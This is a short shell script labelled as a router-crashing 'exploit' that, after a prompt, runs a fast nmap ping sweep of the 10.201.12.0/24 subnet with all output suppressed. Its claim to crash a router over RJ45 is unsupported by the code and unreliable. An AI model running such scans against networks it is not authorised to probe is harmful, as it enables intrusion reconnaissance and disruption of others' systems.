#!/bin/sh

echo this exploit will crash the router if you are using RJ45
echo press [enter]
read x
nmap -sP -T5 10.201.12.0/24 2>/dev/null >/dev/null

